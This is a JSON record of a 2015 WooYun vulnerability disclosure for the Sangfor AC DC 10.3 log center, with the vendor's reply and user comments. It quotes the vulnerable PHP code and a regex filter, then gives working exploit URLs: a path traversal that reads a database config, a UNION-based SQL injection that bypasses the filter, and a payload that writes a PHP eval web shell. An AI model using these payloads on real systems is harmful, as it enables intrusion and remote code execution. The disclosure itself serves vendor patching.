{"id": 22967, "wybug_id": "wooyun-2015-0105026", "wybug_title": "深信服AC DC 10.3漏洞集合第一弹", "wybug_corp": "深信服", "wybug_author": "f4ckbaidu", "wybug_date": "2015-03-31 17:06", "wybug_open_date": "2015-06-30 18:44", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-31：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-04：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-30：\t细节向公众公开  简要描述： 本机测试，没有入侵任何客户，在这里下载的安装包：http://www.sangfor.com.cn/download/product/ac_data_center/DataCenter10.3_Setup.zip这次发的包含2个SQL注射和1个任意文件下载 详细说明：  在说明漏洞前先说明下自带的防攻击措施1、magic_quotes_gpc=ON2、代码用zend加密过，可以用黑刀解密3、系统自带攻击拦截，针对GPC，代码如下：\n$requestfilter = \"\\\\b(and|or)\\\\b.+?(=|>|<|\\\\bin\\\\b|\\\\blike\\\\b)|\\\\/\\\\*.+?\\\\*\\\\/|<\\\\s*script\\\\b|\\\\bUNION\\\\b.+?\\\\bSelect\\\\b|\\\\bUpdate\\\\b.+?\\\\bSET\\\\b|\\\\bInsert\\\\b\\\\s+\\\\bINTO\\\\b.+?\\\\bVALUES\\\\b|\\\\b(Select|Delete)\\\\b.+?\\\\bFROM\\\\b|\\\\b(Create|Alter|Drop|TRUNCATE)\\\\b\\\\s+\\\\b(TABLE|DATABASE)\\\\b\";\n下面是漏洞描述部分：一、任意文件下载1（需要登录）问题文件：/src/download.php\n<?phprequire_once( \"include.php\" );require_once( CONFIG_INC_PHP_PATH.\"config.inc.php\" );if ( isset( $_REQUEST['filename'] ) ){\t\t\t\t$filename = \"../file/\".$_REQUEST['filename'];}if ( strlen( $filename ) == 0 ){\t\t\t\techo \"请设置文件名称.\";\t\t\t\techo \"filename : \".$filename;\t\t\t\texit( );}$Name = substr( $filename, strrpos( $filename, \"/\" ) + 1, strlen( $filename ) );$ext = substr( $Name, strrpos( $Name, \".\" ), 4 );header( \"Content-Type: application/x-\".$ext );header( \"Content-Length: \".filesize( $filename ) );header( \"Content-Disposition: attachment; filename=\".$Name );readfile( $filename );?>\n这个洞没什么好说的，POC：http://192.168.222.101/src/download.php?filename=../inc/dbinfo.conf\n\n二、SQL注射1（需要登录，鸡肋）问题文件：/src/downloadreport.php\n$fields['account'] = $_REQUEST['account_id'];$fields['name'] = $_REQUEST['name'];$fields['time'] = $_REQUEST['time'];$info = $customreport->HistoryReportInfo( $fields );\nfunction HistoryReportInfo位于/src/inc/class/data/customreport.php：可以看到变量account_id直接进入了sql语句\n\n最上面提到的正则拦截了union select，可以用8.0union select bypass之，最后POC：\nhttp://192.168.222.101/src/downloadreport.php?account_id=8.0union select 1,2,3,4,5,6,7\n可惜系统开了magic_quotes_gpc，没办法利用select into outfile getshell三、SQL注射2（需要登录，可getshell）问题文件：/src/getmailfile.php\n$obj = new CActionSearch( );$obj->Init( );$date = \"\".trim( getrequest( \"date\" ) );$str = \"\".trim( getrequest( \"auto_id\" ) );$autoId = urldecode( sdecrypt( $str, 2008 ) );$trecord = $obj->_log->GetRecordByDateId( $date, $autoId );\n\npublic function GetRecordByDateId( $_obfuscate_O6ZGVA, $_obfuscate_0W8 )\t\t\t\t{\t\t\t\t\t\t\t\t$_obfuscate_3y0Y = \"select \".$this->query_cols.\" from A{$_obfuscate_O6ZGVA} A where auto_id = {$_obfuscate_0W8}\";\t\t\t\t\t\t\t\t$_obfuscate_SF4 = $this->fetchAllRows( $_obfuscate_3y0Y );\n看下罪魁祸首的问题函数getrequest：\nfunction getRequest( $_obfuscate_R2_b ){\t\t\t\tif ( get_magic_quotes_gpc( ) )\t\t\t\t{\t\t\t\t\t\t\t\treturn stripslashes( $_REQUEST[$_obfuscate_R2_b] );\t\t\t\t}\t\t\t\treturn $_REQUEST[$_obfuscate_R2_b];}\n开了magic_quotes_gpc也白搭，直接通过stripslashes去掉了“\\”这个地方要想利用还存在一个条件，就是必须存在A表（AC同步过来的行为审计表），既然装了外置DC，还可能会没有AC同步日志过来吗？？这不是个问题我这边没设备用来同步日志只能创建Atest表测试了：\ncreate table Atest(auto_id bigint unsigned not null default 0,record_id bigint unsigned not null,account_id bigint unsigned not null,dev_id bigint unsigned not null default 0,user_crc varchar(128) not null,group_crc varchar(128) not null,ip_type varchar(128) not null,host_ip varchar(128) not null,dst_ip varchar(128) not null,private_type varchar(128) not null,serv_crc varchar(128) not null,app_crc varchar(128) not null,record_time varchar(128) not null,net_action varchar(128) not null,index3 varchar(128) not null,index4 varchar(128) not null,primary key (auto_id))ENGINE=MYISAM\n需要bypass最开始说的正则，bypass方法和上面一样，用8.0union select代替\\bunion select最终getshell EXP：\nhttp://192.168.222.101/src/contentdetail.php?date=test A where 8.0union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,0x3C3F70687020406576616C28245F504F53545B3132335D293B3F3E into outfile 'D:\\\\Program Files\\\\Sangfor\\\\DataCenter\\\\dcweb\\\\shell.php'-- &auto_id=1\n\n\n   漏洞证明：  \n\n\n\n\n\n   修复方案：  自己看着办   版权声明：转载请注明来源 f4ckbaidu@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：4  确认时间：2015-04-01 18:43 厂商回复： 感谢白帽子提出的问题！经过内部确认，该漏洞仅存在于AC 10G版本的外置数据中心。攻击者若想利用漏洞，必须拿到管理员口令登录设备，无法绕过登录进入设备。另外，外置数据中心大多数部署在用户的内网，外网无法访问该数据中心。外置数据中心放置的是设备的日志，利用任意文件下载漏洞下载到的文件均为AC设备的运行情况，客户的核心业务数据并不会受到该漏洞的影响。考虑了以上的因素，我们将漏洞降为低级。我们的补丁包正在制作当中，测试成功后会第一时间发布。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-31 17:19 |    \t\tmilk \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:5        | 美女，你肥皂掉了)\t\t \n  洞主，下次是不是就发深信服AF的了？    \n     2015-03-31 17:43 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  没有5蛋也好意思说    \n     2015-03-31 17:46 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  @xsser 慢慢挖，慢慢发    \n     2015-03-31 17:46 |    \t\t兔八哥 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:3        | 我心飞 翔)\t\t \n  还有深信服aDesk、无线WAC吗。。    \n     2015-03-31 17:52 |    \t\tf4ck \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:7        | 有些人很牛B，一个漏洞能刷成N个。)\t\t \n  $$$    \n     2015-04-01 20:24 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  奖必须有的 哈哈    \n     2015-04-01 20:40 |    \t\t大大灰狼 \t\t\t( 普通白帽子  |\t\t\t        Rank:248 漏洞数:53        | Newbie)\t\t \n  @xsser  什么奖    \n     2015-06-02 10:48 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  @疯狗 这个洞没奖励吗。。。    \n     2015-06-02 10:54 |    \t\tf4ck \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:7        | 有些人很牛B，一个漏洞能刷成N个。)\t\t \n  @f4ckbaidu 等要公开才有奖励吧。    \n     2015-06-02 23:35 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  @f4ck 原来都是向核心公开之前就有奖励了，没奖励算了以后都不发乌云了    \n     2015-06-03 09:02 |    \t\tf4ck \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:7        | 有些人很牛B，一个漏洞能刷成N个。)\t\t \n  @f4ckbaidu 哈哈，xsser都保证说有奖励啦，估计也就一个$，你怎么看。    \n     2015-06-03 16:08 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  @f4ck 就等着一个$拿到手去做大保健    \n     2015-06-03 17:08 |    \t\tf4ck \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:7        | 有些人很牛B，一个漏洞能刷成N个。)\t\t \n  @f4ckbaidu 大表哥，求带上。    \n     2015-06-07 17:48 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  还没奖？    \n     2015-06-07 21:17 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  @xsser 收到了，感谢大乌云    \n     2015-06-07 21:23 |    \t\tf4ck \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:7        | 有些人很牛B，一个漏洞能刷成N个。)\t\t \n  @f4ckbaidu 大表哥，带上我大保健。    \n     2015-06-30 22:04 |    \t\t北京链家房地产经纪有限公司(乌云厂商)\t\t \n  牛    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 4, "Ranks": null}